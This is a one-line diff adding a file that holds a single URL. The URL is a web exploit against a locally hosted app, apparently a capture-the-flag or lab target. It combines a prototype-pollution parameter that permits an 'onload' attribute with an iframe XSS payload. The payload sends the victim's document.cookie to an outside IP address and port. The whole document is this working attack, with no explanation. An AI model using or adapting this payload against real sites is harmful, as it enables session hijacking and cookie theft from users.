@@ -1,0 +1,1 @@
+url: http://127.0.0.1:5000/?__proto__[*]=onload&note=<iframe onload="fetch(`http://46.30.47.219:1488/${document.cookie}`)">
